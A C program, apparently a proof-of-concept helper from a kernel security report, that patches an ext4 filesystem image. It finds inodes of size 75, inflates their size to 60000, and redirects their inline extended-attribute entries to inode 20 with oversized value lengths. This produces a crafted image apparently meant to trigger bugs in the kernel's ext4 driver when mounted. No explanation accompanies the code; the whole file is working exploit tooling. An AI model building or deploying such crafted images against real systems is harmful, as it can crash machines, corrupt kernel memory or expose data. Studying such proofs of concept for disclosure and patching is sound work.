//cat fixup.c
#include <stdint.h>
#include <fcntl.h>
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define __le16 uint16_t
#define __le32 uint32_t
#define __u16 uint16_t
#define __u32 uint32_t
#define __u8 uint8_t

/* some definitions from kernel headers */
#define EXT4_NDIR_BLOCKS    12
#define EXT4_IND_BLOCK      EXT4_NDIR_BLOCKS
#define EXT4_DIND_BLOCK     (EXT4_IND_BLOCK + 1)
#define EXT4_TIND_BLOCK     (EXT4_DIND_BLOCK + 1)
#define EXT4_N_BLOCKS       (EXT4_TIND_BLOCK + 1)
#define EXT4_XATTR_MAGIC    0xEA020000
struct ext4_inode {
    __le16  i_mode;
    __le16  i_uid;
    __le32  i_size_lo;
    __le32  i_atime;
    __le32  i_ctime;
    __le32  i_mtime;
    __le32  i_dtime;
    __le16  i_gid;
    __le16  i_links_count;
    __le32  i_blocks_lo;
    __le32  i_flags;
    union {
    struct {
        __le32  l_i_version;
    } linux1;
    } osd1;
    __le32  i_block[EXT4_N_BLOCKS];
    __le32  i_generation;
    __le32  i_file_acl_lo;
    __le32  i_size_high;
    __le32  i_obso_faddr;
    union {
    struct {
        __le16  l_i_blocks_high;
        __le16  l_i_file_acl_high;
        __le16  l_i_uid_high;
        __le16  l_i_gid_high;
        __le16  l_i_checksum_lo;
        __le16  l_i_reserved;
    } linux2;
    } osd2;
    __le16  i_extra_isize;
    __le16  i_checksum_hi;
    __le32  i_ctime_extra;
    __le32  i_mtime_extra;
    __le32  i_atime_extra;
    __le32  i_crtime;
    __le32  i_crtime_extra;
    __le32  i_version_hi;
    __le32  i_projid;
};
struct ext4_xattr_ibody_header {
    __le32  h_magic;
};
struct ext4_xattr_entry {
    __u8  e_name_len;
    __u8  e_name_index;
    __le16  e_value_offs;
    __le32  e_value_inum;
    __le32  e_value_size;
    __le32  e_hash;
    char  e_name[0];
};

#define INODE_SIZE 256

#define ROUND_UP(x,round) ( ((x)+((round)-1)) & ~((round)-1) )

int main(int argc, char **argv) {
    char *path = argv[1];
    int fd = open(path, O_RDWR);
    if (fd == -1) return -1;
    struct stat st;
    if (fstat(fd, &st)) return -1;
    char *map = mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) return -1;
    for (int i=0; i<st.st_size/INODE_SIZE; i++) {
    struct ext4_inode *ino = (void*)(map + i * INODE_SIZE);
    if (ino->i_links_count != 1 || ino->i_size_lo != 75) continue;
    // printf("found inode (idx=%d, size=%u, mode=%ho)\n",
            // i, ino->i_size_lo, ino->i_mode);
    ino->i_size_lo = 60000;
    // printf("  i_extra_isize = %hu\n", ino->i_extra_isize);
    struct ext4_xattr_ibody_header *hdr =
        (void*)( ((char*)ino)+128+ino->i_extra_isize );
    if (hdr->h_magic != EXT4_XATTR_MAGIC) continue;
    struct ext4_xattr_entry *entry = (void*)(hdr+1);
    while (*(uint32_t*)entry != 0) {
        // printf("  attr: idx=%hhu name='%*s' offs=%hu inum=%u size=%u\n",
            // entry->e_name_index, entry->e_name_len, entry->e_name,
            // entry->e_value_offs, entry->e_value_inum, entry->e_value_size);
        entry->e_value_offs = 0;
        entry->e_value_inum = 20;
        entry->e_value_size = 60000;
        entry = (void*)(
            (char*)entry + sizeof(*entry) + ROUND_UP(entry->e_name_len, 4)
        );
    }
    }
}
    //$ gcc -o fixup fixup.c -Wall